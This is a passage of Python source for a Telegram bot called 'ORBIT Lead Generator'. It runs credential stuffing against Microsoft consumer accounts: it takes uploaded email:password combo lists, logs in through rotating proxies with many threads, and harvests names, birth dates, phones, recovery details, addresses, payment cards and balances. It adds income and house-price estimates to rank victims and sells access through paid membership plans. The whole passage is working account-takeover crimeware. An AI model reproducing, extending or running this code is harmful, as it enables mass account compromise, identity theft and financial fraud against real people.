            'G':'\u00a331,600','GL':'\u00a332,400','GU':'\u00a341,200','HA':'\u00a342,100',
            'HP':'\u00a340,300','HU':'\u00a328,600','IG':'\u00a340,700','IP':'\u00a332,200',
            'KT':'\u00a343,500','L':'\u00a331,300','LE':'\u00a331,000','LS':'\u00a330,800',
            'LU':'\u00a338,500','M':'\u00a332,000','ME':'\u00a336,500','MK':'\u00a337,100',
            'N':'\u00a345,100','NE':'\u00a329,300','NG':'\u00a331,400','NW':'\u00a348,200',
            'OX':'\u00a341,800','PE':'\u00a332,600','PL':'\u00a330,000','PO':'\u00a333,500',
            'RG':'\u00a342,400','RH':'\u00a344,100','RM':'\u00a338,600','S':'\u00a331,700',
            'SE':'\u00a346,300','SL':'\u00a342,700','SM':'\u00a341,500','SN':'\u00a333,800',
            'SO':'\u00a337,400','SS':'\u00a339,200','SW':'\u00a349,100','TN':'\u00a338,400',
            'TS':'\u00a329,000','TW':'\u00a344,500','UB':'\u00a342,300','W':'\u00a353,200',
            'WA':'\u00a341,900','WC':'\u00a356,700','WD':'\u00a343,200','WS':'\u00a330,900',
            'WV':'\u00a329,700','YO':'\u00a330,600',
        }
        for pfx, val in _UK_INC.items():
            if area.startswith(pfx): income = val; break

    # ── US: ZIP → state → income + house price ───────────────────────────────
    elif re.match(r'^\d{5}$', pc) or cc == 'US':
        _US_STATE_INC = {
            'AL':'$52,000','AK':'$77,000','AZ':'$62,000','AR':'$48,000','CA':'$84,000',
            'CO':'$77,000','CT':'$78,000','DE':'$69,000','FL':'$59,000','GA':'$61,000',
            'HI':'$83,000','ID':'$58,000','IL':'$68,000','IN':'$57,000','IA':'$61,000',
            'KS':'$61,000','KY':'$52,000','LA':'$52,000','ME':'$58,000','MD':'$90,000',
            'MA':'$86,000','MI':'$60,000','MN':'$74,000','MS':'$46,000','MO':'$57,000',
            'MT':'$57,000','NE':'$63,000','NV':'$62,000','NH':'$80,000','NJ':'$85,000',
            'NM':'$51,000','NY':'$72,000','NC':'$59,000','ND':'$65,000','OH':'$59,000',
            'OK':'$55,000','OR':'$67,000','PA':'$63,000','RI':'$70,000','SC':'$56,000',
            'SD':'$58,000','TN':'$55,000','TX':'$63,000','UT':'$74,000','VT':'$63,000',
            'VA':'$76,000','WA':'$82,000','WV':'$48,000','WI':'$63,000','WY':'$65,000',
            'DC':'$98,000',
        }
        _US_STATE_HOUSE = {
            'AL':'$185,000','AK':'$315,000','AZ':'$325,000','AR':'$165,000','CA':'$750,000',
            'CO':'$530,000','CT':'$330,000','DE':'$285,000','FL':'$390,000','GA':'$275,000',
            'HI':'$830,000','ID':'$380,000','IL':'$250,000','IN':'$210,000','IA':'$185,000',
            'KS':'$185,000','KY':'$195,000','LA':'$190,000','ME':'$295,000','MD':'$390,000',
            'MA':'$530,000','MI':'$220,000','MN':'$290,000','MS':'$160,000','MO':'$210,000',
            'MT':'$395,000','NE':'$210,000','NV':'$385,000','NH':'$395,000','NJ':'$450,000',
            'NM':'$240,000','NY':'$380,000','NC':'$290,000','ND':'$230,000','OH':'$205,000',
            'OK':'$185,000','OR':'$435,000','PA':'$240,000','RI':'$390,000','SC':'$265,000',
            'SD':'$245,000','TN':'$285,000','TX':'$295,000','UT':'$480,000','VT':'$310,000',
            'VA':'$360,000','WA':'$545,000','WV':'$145,000','WI':'$240,000','WY':'$290,000',
            'DC':'$620,000',
        }
        if pc:
            try:
                r = requests.get(f'https://api.zippopotam.us/us/{pc}', timeout=6)
                if r.status_code == 200:
                    state = r.json().get('places',[{}])[0].get('state abbreviation','')
                    if state:
                        income = _US_STATE_INC.get(state, '$63,000')
                        house  = _US_STATE_HOUSE.get(state, '$295,000')
            except: pass
        if income == 'N/A':
            income = '$74,580'; house = '$418,000'

    # ── Canada: postal → province → income ────────────────────────────────────
    elif re.match(r'^[A-Z]\d[A-Z]', pc.upper()) or cc == 'CA':
        _CA_PROV = {
            'A':'NL','B':'NS','C':'PE','E':'NB','G':'QC','H':'QC','J':'QC',
            'K':'ON','L':'ON','M':'ON','N':'ON','P':'ON','R':'MB','S':'SK',
            'T':'AB','V':'BC','X':'NT','Y':'YT',
        }
        _CA_INC = {
            'BC':'C$72,000','AB':'C$77,000','SK':'C$65,000','MB':'C$62,000',
            'ON':'C$74,000','QC':'C$58,000','NB':'C$52,000','NS':'C$53,000',
            'PE':'C$50,000','NL':'C$56,000','NT':'C$98,000','YT':'C$88,000',
        }
        _CA_HOUSE = {
            'BC':'C$980,000','AB':'C$430,000','SK':'C$320,000','MB':'C$340,000',
            'ON':'C$860,000','QC':'C$420,000','NB':'C$230,000','NS':'C$360,000',
            'PE':'C$330,000','NL':'C$280,000',
        }
        fsa = pc.upper()[0] if pc else ''
        prov = _CA_PROV.get(fsa, '')
        income = _CA_INC.get(prov, 'C$57,400')
        house  = _CA_HOUSE.get(prov, 'C$720,000')

    # ── Australia: state from postcode ────────────────────────────────────────
    elif (re.match(r'^\d{4}$', pc) and cc == 'AU') or cc == 'AU':
        _AU_STATE_INC = {
            'NSW':'A$62,000','VIC':'A$59,000','QLD':'A$57,000','WA':'A$68,000',
            'SA':'A$52,000','TAS':'A$48,000','ACT':'A$88,000','NT':'A$66,000',
        }
        _AU_STATE_HOUSE = {
            'NSW':'A$1,050,000','VIC':'A$820,000','QLD':'A$680,000','WA':'A$580,000',
            'SA':'A$580,000','TAS':'A$510,000','ACT':'A$780,000','NT':'A$480,000',
        }
        state = ''
        if pc:
            n = int(pc) if pc.isdigit() else 0
            if 1000 <= n <= 2999: state='NSW'
            elif 3000 <= n <= 3999: state='VIC'
            elif 4000 <= n <= 4999: state='QLD'
            elif 5000 <= n <= 5999: state='SA'
            elif 6000 <= n <= 6999: state='WA'
            elif 7000 <= n <= 7999: state='TAS'
            elif 800  <= n <= 899:  state='NT'
            elif 200  <= n <= 299:  state='ACT'
        income = _AU_STATE_INC.get(state, 'A$56,800')
        house  = _AU_STATE_HOUSE.get(state, 'A$780,000')

    # ── Germany: PLZ region ───────────────────────────────────────────────────
    elif (re.match(r'^\d{5}$', pc) and cc == 'DE') or cc == 'DE':
        _DE_REG_INC = {
            '1':'€38,200','2':'€39,100','3':'€34,800','4':'€37,200','5':'€38,900',
            '6':'€36,100','7':'€38,400','8':'€42,100','9':'€33,200',
        }
        prefix = pc[0] if pc else ''
        income = _DE_REG_INC.get(prefix, '€41,200')
        house  = '€400,000'

    # ── France: departement ───────────────────────────────────────────────────
    elif (re.match(r'^\d{5}$', pc) and cc == 'FR') or cc == 'FR':
        dept = pc[:2] if pc else ''
        if dept == '75': income='€54,000'; house='€550,000'
        elif dept in ('92','78','91','95'): income='€48,000'; house='€380,000'
        else: income='€37,100'; house='€250,000'

    # ── Netherlands ───────────────────────────────────────────────────────────
    elif cc == 'NL':
        income='€42,100'; house='€390,000'

    # ── Country-level fallback (80+ countries) ────────────────────────────────
    if income == 'N/A' or house == 'N/A':
        if cc in _COUNTRY_DATA:
            c_income, c_house = _COUNTRY_DATA[cc]
            if income == 'N/A': income = c_income
            if house  == 'N/A': house  = c_house

    return house, income


def extract_one(email, password, proxy=None):
    result = {'email':email,'password':password,'status':'ERROR'}
    try:
        session = create_optimized_session()
        if proxy:
            session.proxies = {'http': proxy, 'https': proxy}

        login = ms_login_robust(email, password, session)

        if login in ('None','BAD'):
            try: session.close()
            except: pass
            return {**result,'status':'BAD'}
        if login == '2FA':
            try: session.close()
            except: pass
            return {**result,'status':'2FA'}
        if login == 'ERROR':
            try: session.close()
            except: pass
            return {**result,'status':'ERROR'}

        # Login succeeded — unpack
        if isinstance(login, tuple):
            session, _ = login

        # Initialize data with defaults
        data = {'name':'N/A','country':'N/A','dob':'N/A','phone':'N/A',
                'recovery':'N/A','address':'N/A','postcode':'N/A',
                'avg_house':'N/A','med_income':'N/A','cards':[],'balance':'$0.00'}

        # Each extraction independent — one crash doesn't kill others
        try:
            data['name'], data['country'] = extract_profile(session)
        except Exception as e:
            logger.warning(f"profile fail {email}: {e}")

        try:
            data['dob'] = extract_dob(session)
        except Exception as e:
            logger.warning(f"dob fail {email}: {e}")

        try:
            data['phone'], data['recovery'] = extract_phone_recovery(session)
        except Exception as e:
            logger.warning(f"phone fail {email}: {e}")

        try:
            data['cards'], data['address'], data['postcode'], data['balance'] = extract_payment(session)
        except Exception as e:
            logger.warning(f"payment fail {email}: {e}")

        try:
            data['avg_house'], data['med_income'] = extract_enrichment(data['country'], data['postcode'])
        except Exception as e:
            logger.warning(f"enrichment fail {email}: {e}")

        try: session.close()
        except: pass

        lead_line = format_lead(email, password, data)
        return {**result, 'status':'LEAD', 'data':data, 'lead_line':lead_line}

    except Exception as e:
        logger.warning(f"FATAL extract_one {email}: {type(e).__name__}: {e}")
        return {**result,'status':'ERROR'}


# ── Engine ────────────────────────────────────────────────────────────────────

class LeadEngine:
    def __init__(self, threads=30, lines=None, proxy_list=None):
        self.threads     = min(int(threads), 300)
        self.combos      = lines or []
        self.proxy_list  = proxy_list or []
        self._proxy_idx  = 0
        self._proxy_lock = threading.Lock()
        self.q           = queue.Queue()
        self.lock        = threading.Lock()
        self.running     = True
        self.stopped     = False
        self.paused      = False
        self.start_time  = None
        self.results     = {'leads':[],'twofa':[],'bad':[],'errors':[]}
        self.stats       = {'total':0,'checked':0,'leads':0,'twofa':0,'bad':0,'errors':0,'cpm':0}

    def _get_proxy(self):
        if not self.proxy_list: return None
        with self._proxy_lock:
            p = self.proxy_list[self._proxy_idx % len(self.proxy_list)]
            self._proxy_idx += 1
        return p

    def worker(self):
        while self.running and not self.stopped:
            if self.paused: time.sleep(0.1); continue
            try: email, password = self.q.get(timeout=1)
            except queue.Empty: continue
            proxy = self._get_proxy()
            r = extract_one(email, password, proxy)
            if r['status'] == 'ERROR':
                proxy = self._get_proxy()
                r = extract_one(email, password, proxy)
            if r['status'] == 'ERROR':
                r = extract_one(email, password, None)  # last try direct
            st = r['status']
            with self.lock:
                self.stats['checked'] += 1
                if st == 'LEAD':
                    self.stats['leads'] += 1; self.results['leads'].append(r)
                elif st == '2FA':
                    self.stats['twofa'] += 1; self.results['twofa'].append(r)
                elif st == 'BAD':
                    self.stats['bad']   += 1; self.results['bad'].append(r)
                else:
                    self.stats['errors']+= 1; self.results['errors'].append(r)
                el = (datetime.now()-self.start_time).total_seconds() if self.start_time else 1
                if el > 0: self.stats['cpm'] = int(self.stats['checked']/el*60)
            self.q.task_done()

    def load(self):
        seen, valid = set(), []
        for line in self.combos:
            line = line.strip()
            if ':' not in line: continue
            em,pw = line.split(':',1)
            em = em.strip().lower(); pw = pw.strip()
            if not em or not pw: continue
            dom = em.split('@')[-1] if '@' in em else ''
            if dom not in MS_DOMAINS: continue
            key = f'{em}:{pw}'
            if key in seen: continue
            seen.add(key); valid.append((em,pw))
        self.stats['total'] = len(valid)
        for em,pw in valid: self.q.put((em,pw))

    def start(self):
        self.load(); self.start_time = datetime.now()
        target = self.threads; step = max(1,target//10)
        all_w = []
        def launch(n):
            for _ in range(n):
                t = threading.Thread(target=self.worker,daemon=True)
                t.start(); all_w.append(t)
        launch(min(step,target)); started = min(step,target)
        def ramp():
            nonlocal started
            while started < target and self.running and not self.stopped:
                time.sleep(8); add = min(step,target-started)
                launch(add); started += add
        threading.Thread(target=ramp,daemon=True).start()
        for t in all_w: t.join()
        self.running = False

    def stop(self):   self.stopped=True; self.running=False
    def pause(self):  self.paused=True
    def resume(self): self.paused=False
    def get_stats(self):
        with self.lock: return self.stats.copy()
    def is_finished(self):
        if self.stopped or not self.running: return True
        if not self.stats.get('total'): return False
        return self.q.empty() and self.stats['checked'] >= self.stats['total']

    def save(self, folder):
        os.makedirs(folder, exist_ok=True)
        written = []; HDR = "🔍 ORBIT Lead Generator\n" + "─"*44 + "\n"
        def w(name, lines):
            if not lines: return
            path = os.path.join(folder,name)
            with open(path,'a',encoding='utf-8',errors='replace') as f:
                if not os.path.exists(path) or os.path.getsize(path)==0: f.write(HDR)
                f.write('\n'.join(lines)+'\n')
            if path not in written: written.append(path)
        leads = self.results['leads']
        # Filter out empty leads (static config fake hits — name+country both N/A)
        full  = [r for r in leads if not r.get('is_2fa') and
                 (r.get('data',{}).get('name','N/A') != 'N/A' or
                  r.get('data',{}).get('country','N/A') != 'N/A')]
        tfa   = [r for r in leads if r.get('is_2fa')]
        w('Leads.txt',       [r['lead_line'] for r in full if r.get('lead_line')])
        w('WithCards.txt',   [r['lead_line'] for r in full if r.get('data',{}).get('cards')])
        w('WithDOB.txt',     [r['lead_line'] for r in full if r.get('data',{}).get('dob','N/A') not in ('N/A','2FA')])
        w('WithPhone.txt',   [r['lead_line'] for r in full if r.get('data',{}).get('phone','N/A')!='N/A'])
        w('WithAddress.txt', [r['lead_line'] for r in full if r.get('data',{}).get('address','N/A')!='N/A'])
        if tfa: w('2FA_Info.txt', [r['lead_line'] for r in tfa if r.get('lead_line')])
        w('2FA.txt', [f"{r['email']}:{r['password']}" for r in self.results['twofa']])
        return written

# ── Bot State ─────────────────────────────────────────────────────────────────
active: Dict[int, LeadEngine] = {}
queue_pos: Dict[int,int] = {}
_qcount = 0

# ── Helpers ───────────────────────────────────────────────────────────────────
def is_admin(uid): return uid in ADMIN_IDS
def fmt(n): return f'{n:,}'

def prog_msg(s, filename, elapsed, paused=False):
    t = max(s['total'],1); pct = s['checked']/t*100
    bar = '█'*int(pct/5) + '░'*(20-int(pct/5))
    pre = "⏸️ *PAUSED*\n\n" if paused else ""
    return (f"{pre}📊 `{s['checked']:,}/{t:,}` ({pct:.1f}%)\n[{bar}]\n\n"
            f"🎯 LEADS: `{s['leads']}`\n🔒 2FA: `{s['twofa']}`\n"
            f"❌ BAD: `{s['bad']}`\n⚠️ ERROR: `{s['errors']}`\n\n"
            f"⏱️ {elapsed} · ⚡ CPM: `{s['cpm']:,}`\n\n_/pause · /stop_")

def done_msg(s, filename, elapsed_sec):
    m,sec = int(elapsed_sec//60), int(elapsed_sec%60)
    rate  = s['leads']/max(s['checked'],1)*100
    err_note = ""
    if s['errors'] > s['checked'] * 0.5:
        err_note = "\n\n⚠️ _High error rate — check terminal for details_"
    return (f"✅ *Scan Complete*\n\n📄 `{filename}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Checked: `{fmt(s['checked'])}`\n"
            f"🎯 Leads: `{fmt(s['leads'])}` ({rate:.1f}%)\n"
            f"🔒 2FA: `{fmt(s['twofa'])}`\n"
            f"❌ Bad: `{fmt(s['bad'])}`\n"
            f"⚠️ Errors: `{fmt(s['errors'])}`\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⏱️ `{m}m {sec}s` · ⚡ `{s['cpm']:,}` CPM{err_note}")

# ── Handlers ──────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u   = db_user(uid, update.effective_user.username or '', update.effective_user.first_name or '')
    p   = get_plan(u); rem = check_daily(u)
    plan_name = u.get('plan','free').upper()
    exp  = u.get('plan_expires','')
    exp_str = f" · Expires: {exp[:10]}" if exp and u.get('plan','free')!='free' else ''
    kb = [
        [InlineKeyboardButton("📤 Upload Combos", callback_data='upload')],
        [InlineKeyboardButton("🌐 My Proxies", callback_data='proxies'),
         InlineKeyboardButton("📊 Stats", callback_data='stats')],
        [InlineKeyboardButton("👑 Membership", callback_data='membership')],
    ]
    if is_admin(uid):
        kb.append([InlineKeyboardButton("⚙️ Admin", callback_data='admin')])
    await update.message.reply_text(
        f"🔍 *ORBIT Lead Generator*\n\n"
        f"👤 Plan: *{plan_name}*{exp_str}\n"
        f"📋 Daily Remaining: *{fmt(rem) if rem < 999999 else '∞'}*\n"
        f"🎯 Total Leads: *{fmt(u.get('total_leads',0))}*\n\n"
        f"Extracts: Name · Country · DOB · Phone\n"
        f"Address · Postcode · Cards · Balance\n"
        f"Avg House Price · Median Income",
        reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    u   = db_user(uid); p = get_plan(u)
    daily = p['daily']; used = u.get('daily_used',0)
    await update.message.reply_text(
        f"📊 *Your Stats*\n\n"
        f"👤 Plan: *{u.get('plan','free').upper()}*\n"
        f"🎯 Total Leads: *{fmt(u.get('total_leads',0))}*\n"
        f"📋 Total Checked: *{fmt(u.get('total_checked',0))}*\n"
        f"📆 Daily: *{fmt(used)}* / *{'∞' if daily>=999999 else fmt(daily)}*\n"
        f"🧵 Max Threads: *{p['threads']}*", parse_mode='Markdown')

async def cmd_pause(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in active:
        await update.message.reply_text("❌ No active scan."); return
    e = active[uid]
    if e.paused:
        e.resume()
        s = e.get_stats()
        await update.message.reply_text(
            f"▶️ *Resumed*\n\n`{s['checked']:,}/{s['total']:,}`\n🎯 Leads: `{s['leads']}`",
            parse_mode='Markdown')
    else:
        e.pause()
        s = e.get_stats()
        await update.message.reply_text(
            f"⏸️ *Paused*\n\n`{s['checked']:,}/{s['total']:,}`\n🎯 Leads so far: `{s['leads']}`\n\n_/pause again to resume_",
            parse_mode='Markdown')

async def cmd_resume(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in active: await update.message.reply_text("❌ No active scan."); return
    e = active[uid]
    if not e.paused: await update.message.reply_text("⚡ Already running!"); return
    e.resume(); s = e.get_stats()
    await update.message.reply_text(
        f"▶️ *Resumed*\n\n`{s['checked']:,}/{s['total']:,}`\n🎯 Leads: `{s['leads']}`",
        parse_mode='Markdown')

async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in active: await update.message.reply_text("❌ No active scan."); return
    filename = context.user_data.get('filename','combos.txt')
    await update.message.reply_text("🛑 Stopping and saving results...")
    await _finish(uid, context, update.message.chat_id, filename, active[uid])

async def cmd_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if uid not in active: await update.message.reply_text("❌ No active scan."); return
    e = active[uid]; s = e.get_stats()
    el = (datetime.now()-e.start_time).total_seconds() if e.start_time else 0
    dur = f"{int(el//60)}m {int(el%60)}s" if el>=60 else f"{int(el)}s"
    await update.message.reply_text(
        prog_msg(s, context.user_data.get('filename',''), dur, e.paused),
        parse_mode='Markdown')

async def btn(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query; await q.answer()
    uid = update.effective_user.id; d = q.data

    if d == 'upload':
        context.user_data['state'] = 'awaiting_combo'
        await q.edit_message_text(
            "📤 *Send your combo file*\n\nFormat: `email:password` per line (.txt)\n"
            "_Supported: hotmail · outlook · live · msn_", parse_mode='Markdown')

    elif d == 'proxies':
        context.user_data['state'] = 'awaiting_proxies'
        cnt = len(db_proxies(uid))
        await q.edit_message_text(
            f"🌐 *Your Proxies*\n\nSaved: `{cnt}`\n\n"
            f"Send a .txt file with proxies.\nFormats: `ip:port` `ip:port:user:pass` `user:pass@ip:port`",
            parse_mode='Markdown')

    elif d == 'stats':
        await cmd_stats(update, context)

    elif d == 'membership':
        u = db_user(uid)
        exp = u.get('plan_expires',''); exp_str = f"\nExpires: {exp[:10]}" if exp else ''
        kb = [
            [InlineKeyboardButton("📅 Weekly — $5",   callback_data='buy_weekly')],
            [InlineKeyboardButton("💎 Monthly — $15",  callback_data='buy_monthly')],
            [InlineKeyboardButton("🏆 Yearly — $100",  callback_data='buy_yearly')],
            [InlineKeyboardButton("🔙 Back", callback_data='back_start')],
        ]
        await q.edit_message_text(
            f"👑 *Membership*\n\nCurrent: *{u.get('plan','free').upper()}*{exp_str}\n\n"
            f"🆓 *Free* — 5K/day · 30 threads\n"
            f"📅 *Weekly* $5 — 15K/day · 80 threads\n"
            f"💎 *Monthly* $15 — Unlimited · 100 threads\n"
            f"🏆 *Yearly* $100 — Unlimited · 150 threads\n\n"
            f"_Contact @YourAdmin to purchase_",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

    elif d in ('buy_weekly','buy_monthly','buy_yearly'):
        await q.edit_message_text(
            f"📞 Contact @YourAdmin to purchase *{d.replace('buy_','').upper()}* plan.",
            parse_mode='Markdown')

    elif d == 'admin' and is_admin(uid):
        c = sqlite3.connect(DB_PATH); c.row_factory = sqlite3.Row
        total_u = c.execute('SELECT COUNT(*) FROM users').fetchone()[0]
        total_l = c.execute('SELECT SUM(total_leads) FROM users').fetchone()[0] or 0
        c.close()
        kb = [
            [InlineKeyboardButton("👥 Users",    callback_data='adm_users'),
             InlineKeyboardButton("📊 Stats",    callback_data='adm_stats')],
            [InlineKeyboardButton("📢 Broadcast", callback_data='adm_broadcast'),
             InlineKeyboardButton("➕ Add Plan",  callback_data='adm_addplan')],
            [InlineKeyboardButton("🚫 Ban User",  callback_data='adm_ban'),
             InlineKeyboardButton("🌐 Proxies",   callback_data='adm_proxies')],
            [InlineKeyboardButton("🔙 Back", callback_data='back_start')],
        ]
        await q.edit_message_text(
            f"⚙️ *Admin Panel*\n\n👥 Users: `{total_u}`\n"
            f"🎯 Total Leads: `{fmt(total_l)}`\n"
            f"🔄 Active Scans: `{len(active)}`\n"
            f"⏳ Queue: `{len(queue_pos)}`",
            reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')

    elif d == 'adm_stats' and is_admin(uid):
        c = sqlite3.connect(DB_PATH); c.row_factory = sqlite3.Row
        total_u = c.execute('SELECT COUNT(*) FROM users').fetchone()[0]
        total_l = c.execute('SELECT SUM(total_leads) FROM users').fetchone()[0] or 0
        total_c = c.execute('SELECT SUM(total_checked) FROM users').fetchone()[0] or 0
        vip_u   = c.execute("SELECT COUNT(*) FROM users WHERE plan!='free'").fetchone()[0]
        c.close()
        await q.edit_message_text(
            f"📊 *Global Stats*\n\n👥 Users: `{total_u}`\n💎 VIP: `{vip_u}`\n"
            f"🎯 Leads: `{fmt(total_l)}`\n📋 Checked: `{fmt(total_c)}`\n"
            f"🔄 Active: `{len(active)}`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙",callback_data='admin')]]),
            parse_mode='Markdown')

    elif d.startswith('adm_users') and is_admin(uid):
        page = int(d.split('_p')[-1]) if '_p' in d else 0
        per  = 10
        rows = db_users_all()
        rows.sort(key=lambda r: r.get('total_leads',0), reverse=True)
        chunk = rows[page*per:(page+1)*per]
        lines = [f"`{r['uid']}` @{r.get('username','?')} — {r.get('plan','free')} — {fmt(r.get('total_leads',0))} leads"
                 for r in chunk]
        nav = []
        if page > 0: nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f'adm_users_p{page-1}'))
        if (page+1)*per < len(rows): nav.append(InlineKeyboardButton("Next ▶️", callback_data=f'adm_users_p{page+1}'))
        kb_admin = []
        if nav: kb_admin.append(nav)
        kb_admin.append([InlineKeyboardButton("🔙", callback_data='admin')])
        await q.edit_message_text(
            f"👥 *Users* (page {page+1}/{max(1,(len(rows)+per-1)//per)})\n\n" + '\n'.join(lines),
            reply_markup=InlineKeyboardMarkup(kb_admin),
            parse_mode='Markdown')

    elif d == 'adm_broadcast' and is_admin(uid):
        context.user_data['state'] = 'adm_broadcast'
        await q.edit_message_text("📢 Send broadcast message:")

    elif d == 'adm_addplan' and is_admin(uid):
        context.user_data['state'] = 'adm_addplan'
        await q.edit_message_text(
            "➕ Format: `uid plan days`\nExample: `123456 monthly 30`\n"
            "Plans: `weekly` `monthly` `yearly`", parse_mode='Markdown')

    elif d == 'adm_ban' and is_admin(uid):
        context.user_data['state'] = 'adm_ban'
        await q.edit_message_text("🚫 Send user ID to ban/unban:")

    elif d == 'adm_proxies' and is_admin(uid):
        context.user_data['state'] = 'adm_gproxies'
        await q.edit_message_text("🌐 Send global proxy .txt file:")

    elif d == 'back_start':
        await cmd_start(update, context)

async def file_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid   = update.effective_user.id
    state = context.user_data.get('state','')
    doc   = update.message.document
    if not doc: return

    if state == 'awaiting_proxies':
        f = await context.bot.get_file(doc.file_id)
        data = await f.download_as_bytearray()
        lines = [l.strip() for l in data.decode('utf-8','ignore').splitlines() if l.strip()]
        db_save_proxies(uid, lines)
        context.user_data['state'] = None
        await update.message.reply_text(f"✅ *{len(lines):,} proxies saved!*", parse_mode='Markdown')
        return

    if state == 'adm_gproxies' and is_admin(uid):
        f = await context.bot.get_file(doc.file_id)
        data = await f.download_as_bytearray()
        lines = [l.strip() for l in data.decode('utf-8','ignore').splitlines() if l.strip()]
        # Save globally as admin's proxies
        db_save_proxies(0, lines)
        context.user_data['state'] = None
        await update.message.reply_text(f"✅ Global pool: *{len(lines):,}* proxies", parse_mode='Markdown')
        return

    if state != 'awaiting_combo': return
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Send a .txt file."); return
    if doc.file_size > MAX_FILE_MB * 1024 * 1024:
        await update.message.reply_text(f"❌ File too large (max {MAX_FILE_MB}MB)."); return

    u = db_user(uid, update.effective_user.username or '')
    if u.get('is_banned'):
        await update.message.reply_text("❌ You are banned."); return

    f = await context.bot.get_file(doc.file_id)
    raw = await f.download_as_bytearray()
    all_lines = [l.strip() for l in raw.decode('utf-8','ignore').splitlines()
                 if l.strip() and ':' in l]
    if not all_lines:
        await update.message.reply_text("❌ No valid combos found."); return

    lines, skipped = [], 0
    seen = set()
    for line in all_lines:
        em = line.split(':',1)[0].strip().lower()
        dom = em.split('@')[-1] if '@' in em else ''
        if dom not in MS_DOMAINS: skipped += 1; continue
        key = line.lower()
        if key in seen: skipped += 1; continue
        seen.add(key); lines.append(line)

    if not lines:
        await update.message.reply_text("❌ No Microsoft domain combos found."); return

    remaining = check_daily(u)
    p = get_plan(u)
    if remaining <= 0 and p['daily'] < 999999:
        await update.message.reply_text(
            f"⛔ Daily limit reached (`{p['daily']:,}` lines). Resets at midnight UTC.",
            parse_mode='Markdown'); return
    if p['daily'] < 999999: lines = lines[:remaining]
    if p['daily'] < 999999: lines = lines[:min(len(lines), 50000)]

    context.user_data['state']    = None
    context.user_data['combos']   = lines
    context.user_data['filename'] = doc.file_name
    context.user_data['skipped']  = skipped

    if uid in active:
        await update.message.reply_text("⚡ Scan already running! Use /stop first."); return

    await _do_scan(update, context)

async def _do_scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global _qcount
    uid      = update.effective_user.id
    lines    = context.user_data.get('combos',[])
    filename = context.user_data.get('filename','combos.txt')
    skipped  = context.user_data.get('skipped',0)
    u = db_user(uid); p = get_plan(u)

    # Queue check
    if len(active) >= MAX_CONCURRENT and p['daily'] < 999999:
        _qcount += 1; my_seq = _qcount; queue_pos[uid] = my_seq
        def mypos(): return sum(1 for v in queue_pos.values() if v < my_seq)+1
        qm = await update.message.reply_text(
            f"⏳ *Queue #{mypos()}*\n\n🔄 Active: `{len(active)}`\n"
            f"💎 VIP users skip queue — /start → 👑 Membership",
            parse_mode='Markdown')
        waited = 0
        while len(active) >= MAX_CONCURRENT and waited < 900:
            await asyncio.sleep(8); waited += 8
            try: await qm.edit_text(
                f"⏳ *Queue #{mypos()}*\n\n🔄 Active: `{len(active)}`\n⏱️ Waited: `{waited}s`",
                parse_mode='Markdown')
            except Exception: pass
        queue_pos.pop(uid, None)
        if len(active) >= MAX_CONCURRENT:
            await update.message.reply_text("❌ Queue timeout. Try again."); return
        try: await qm.edit_text("✅ *Starting now!* 🚀", parse_mode='Markdown')
        except Exception: pass

    # Proxies
    user_proxies  = db_proxies(uid)
    global_proxies= db_proxies(0)
    proxy_list    = user_proxies or global_proxies

    threads = p['threads']
    notify  = [f"📋 `{len(lines):,}` combos loaded"]
    if skipped: notify.append(f"⏭️ `{skipped:,}` wrong domain skipped")
    await update.message.reply_text('\n'.join(notify), parse_mode='Markdown')

    msg = await update.message.reply_text(
        f"⚙️ *Starting...*\n📄 `{filename}`\n🧵 Threads: `{threads}`\n📋 `{len(lines):,}` combos",
        parse_mode='Markdown')

    engine = LeadEngine(threads=threads, lines=lines, proxy_list=proxy_list)
    active[uid] = engine
    db_update(uid, daily_used=u.get('daily_used',0)+len(lines),
              total_checked=u.get('total_checked',0)+len(lines))

    context.user_data['filename'] = filename

    async def updater():
        await asyncio.sleep(2)
        while uid in active and not engine.is_finished():
            await asyncio.sleep(4)
            if engine.stopped: break
            s = engine.get_stats()
            if engine.start_time:
                el  = (datetime.now()-engine.start_time).total_seconds()
                dur = f"{int(el//60)}m {int(el%60)}s" if el>=60 else f"{int(el)}s"
                try: await msg.edit_text(prog_msg(s,filename,dur,engine.paused), parse_mode='Markdown')
                except Exception: pass
        if uid in active:
            await _finish(uid, context, update.message.chat_id, filename, engine)

    asyncio.create_task(updater())
    import concurrent.futures
    loop = asyncio.get_event_loop()
    loop.run_in_executor(None, engine.start)

async def _finish(uid, context, chat_id, filename, engine):
    engine.stop(); await asyncio.sleep(1)
    s  = engine.get_stats()
    el = (datetime.now()-engine.start_time).total_seconds() if engine.start_time else 0
    db_update(uid, total_leads=db_user(uid).get('total_leads',0)+s['leads'])
    try: await context.bot.send_message(chat_id, done_msg(s,filename,el), parse_mode='Markdown')
    except Exception: pass
    ts     = datetime.now().strftime('%Y%m%d_%H%M%S')
    folder = f"/tmp/leads_{uid}_{ts}"
    try:
        written = engine.save(folder)
        if written:
            zpath = f"{folder}.zip"
            with zipfile.ZipFile(zpath,'w',zipfile.ZIP_DEFLATED) as zf:
                for fp in written: zf.write(fp, os.path.basename(fp))
            with open(zpath,'rb') as zf:
                await context.bot.send_document(
                    chat_id, zf, filename=f"Leads_{s['leads']}Found_{ts}.zip",
                    caption=f"🎯 *{s['leads']} leads found*", parse_mode='Markdown')
            os.remove(zpath)
        else:
            await context.bot.send_message(chat_id, "📭 No leads found.")
    except Exception as e:
